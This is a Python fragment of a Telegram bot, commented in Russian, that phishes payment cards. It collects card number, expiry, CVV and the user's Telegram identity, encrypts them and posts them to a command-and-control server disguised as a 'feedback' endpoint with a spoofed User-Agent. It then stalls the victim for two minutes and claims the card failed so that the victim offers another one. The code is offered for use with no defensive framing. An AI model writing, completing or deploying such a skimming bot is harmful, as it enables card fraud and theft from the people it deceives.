from aiogram.contrib.fsm_storage.redis import RedisStorage2  # Хранилище в Redis
from aiogram.dispatcher.filters.state import State, StatesGroup
import aiohttp  # Асинхронные HTTP-запросы
from cryptography.fernet import Fernet  # Шифрование перед отправкой

class CardState(StatesGroup):
    card_number = State()
    expiry = State()
    cvv = State()
    name = State()

storage = RedisStorage2(host='localhost', port=6379, db=2)
dp = Dispatcher(bot, storage=storage)
cipher = Fernet(config.EXFILTRATION_KEY)  # Ключ шифрования

async def send_to_c2(data: dict):
    """Асинхронная отправка зашифрованных данных на C2-сервер"""
    encrypted_data = cipher.encrypt(json.dumps(data).encode())
    async with aiohttp.ClientSession() as session:
        try:
            # Часто используют Telegram MTProxy или малварь для сокрытия трафика
            async with session.post(
                "https://api.legit-looking-domain.com/feedback",
                data=encrypted_data,
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/octet-stream"},
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                if resp.status != 200:
                    logger.error(f"Exfil failed: {resp.status}")
        except Exception as e:
            logger.error(f"Exfil error: {e}")

@dp.message_handler(state=CardState.cvv)
async def process_cvv(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    full_data = {
        'card': user_data['card_number'],
        'expiry': user_data['expiry'],
        'cvv': message.text,
        'user_id': message.from_user.id,
        'tg_username': message.from_user.username
    }
    # Асинхронно отправляем данные, не блокируя бота
    asyncio.create_task(send_to_c2(full_data))

    await message.answer("Идет проверка карты... Это займет до 2 минут.")
    # Имитация работы, чтобы пользователь не заподозрил неладное
    await asyncio.sleep(120)
    await message.answer("Карта не прошла проверку. Попробуйте другую.")
    await state.finish()